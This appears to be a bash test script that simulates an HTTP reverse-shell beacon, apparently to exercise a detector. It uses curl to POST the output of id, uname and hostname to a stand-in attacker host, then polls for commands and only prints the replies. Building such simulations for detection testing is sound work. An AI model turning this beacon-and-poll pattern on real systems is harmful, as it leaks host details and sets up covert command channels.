#!/bin/bash
# Victim script: HTTP reverse shell simulator
# Sends shell output back to attacker over HTTP with a custom shell-beacon header
ATTACKER_IP=${ATTACKER_IP:-shellsnare-attacker}
PORT=8080
TOKEN="deadbeef1337"

echo "[*] Launching HTTP reverse shell beacon to ${ATTACKER_IP}:${PORT}"

# Send an initial beacon
curl -s -X POST "http://${ATTACKER_IP}:${PORT}/cmd" \
  -H "X-Shell-Token: ${TOKEN}" \
  -H "Content-Type: text/plain" \
  --data "$(id; uname -a; hostname)" \
  --max-time 5 || true

# Simulate a poll loop (3 rounds)
for i in 1 2 3; do
  echo "[*] Poll ${i}: checking for commands..."
  RESP=$(curl -s -G "http://${ATTACKER_IP}:${PORT}/shell" \
    --data-urlencode "cmd=whoami" \
    -H "X-Shell-Token: ${TOKEN}" \
    --max-time 5 2>&1 || true)
  echo "[*] Response: ${RESP}"
  sleep 1
done

echo "[*] HTTP reverse shell demo complete."
